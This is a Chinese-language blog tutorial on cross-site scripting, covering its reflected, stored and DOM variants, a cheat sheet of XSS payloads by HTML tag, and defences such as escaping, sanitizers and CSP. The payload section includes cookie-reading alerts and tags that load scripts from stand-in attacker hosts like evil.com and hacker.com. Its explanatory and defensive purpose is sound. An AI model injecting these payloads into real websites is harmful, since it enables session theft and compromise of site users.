---
title: XSS(跨站脚本)漏洞及解决
date: 2021-03-11 21:12:40
categories: 前端
---

xss是什么
----
xss跨站脚本攻击(Cross Site Scripting)，是一种经常出现在web应用中的计算机安全漏洞，它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入的恶意html代码会被执行，从而达到恶意用户的特殊目的。
![](https://upload-images.jianshu.io/upload_images/10024246-d5e55ef5a0ced4ac.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

**本质：**浏览器把输入数据插`入页面`中，当成`脚本执行`;
**XSS分为：**
- 存储型 
      存储区域在后端数据库，插入点在HTML
- 反射型 
 存储区域在URL，插入点在HTML
- DOM型XSS
存储区域在数据库、前端存储、URL都可能发生；插入点在javascript
## 反射型XSS
- 1、攻击者构造出特殊的 URL，其中包含恶意代码。 
- 2、攻击者诱使用户点击链接，恶意代码被拼接到 HTML 中返回给浏览
器。 
- 3、浏览器解析执行。
- 4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。

>常⻅于用户登陆、数据搜索等位置

## 存储型XSS
- 1、攻击者构造恶意代码，并提交保存到数据库。 
- 2、用户打开应用，从数据库读取恶意代码，拼接到 HTML 中返回给浏览
器。
- 3、浏览器解析执行。
- 4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调用目标网站接口执行攻击者指定的操作。
>常⻅于如论坛发帖、商品评论、用户信息修改等
 
 ## DOM型XSS
- 1、攻击者构造出特殊的 URL，其中包含恶意代码。
- 2、攻击者诱使用户点击链接。 
- 3、浏览器解析执行，前端取出 URL 中的恶意代码并执行。
- 4、恶意代码窃取用户数据并发送到攻击者的网站。攻击者冒充用户的行 为，调>用目标网站接口执行攻击者指定的操作。
## XSS的攻击载荷
- <script>标签：<script>标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，也可以将代码插入脚本标记中
```
<script src=http://xxx.com/xss.js></script>  #引用外部的xss
<script> alert("hack")</script>   #弹出hack
<script>alert(document.cookie)</script> #弹出cookie
```
<img>标签：
```
<img  src=1  onerror=alert("hack")>
<img  src=1  onerror=alert(/hack/)>
<img  src=1  onerror=alert(document.cookie)>  #弹出cookie
<img  src=1  onerror=alert(123)>      注：对于数字，可以不用引号
<img  src="javascript:alert("XSS");">
<img  dynsrc="javascript:alert('XSS')">
<img  lowsrc="javascript:alert('XSS')">
```
- <body>标签：可以使用onload属性或其他更加模糊的属性（如属性）在标记内部传递XSS有效内容background
```
<body onload=alert("XSS")>
<body background="javascript:alert("XSS")">
```
- <iframe>标签：该<iframe>标签允许另一个HTML网页的嵌入到父页面。
`IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段`
```
<iframe src=”http://evil.com/xss.html”>
```
- <input>标签：在某些浏览器中，如果标记的type属性<input>设置为image，则可以对其进行操作以嵌入脚本
```
<input type="image" src="javascript:alert('XSS');">
```
- <link>标签：<link>标签，这是经常被用来连接外部的样式表可以包含的脚本
```
<link rel="stylesheet" href="javascript:alert('XSS');">
```
- <table>标签：可以利用和标签的background属性来引用脚本而不是图像
```
<table background="javascript:alert('XSS')">
 
<td background="javascript:alert('XSS')">
```
- <div>标签：该<div>标签，类似于<table>和<td>标签也可以指定一个背景，因此嵌入的脚本。
```
<div style="background-image: url(javascript:alert('XSS'))">
 
<div style="width: expression(alert('XSS'));">
```
- <object>标签：该<object>标签可用于从外部站点脚本包含
```
<object type="text/x-scriptlet" data="http://hacker.com/xss.html">
```

## 防御
- 利用模板引擎 
模板引擎一般自带转义，需尽量保持最新，避免低版本漏洞
- 避免内联事件
 尽量不要用onLoad=“onload(‘{{data}}’)”
onClick=“go(‘{{action}}’)” 这种写法
- 避免拼接 HTML
使用成熟的渲染框架，并保持新版本+后端过滤，如vue，angular等 
使用成熟的过滤器，并保持新版本，如ESAPI，Dompurify等
- 增加攻击难度，降低攻击后果 
严格白名单、规范的CSP、限制⻓度、http-only等
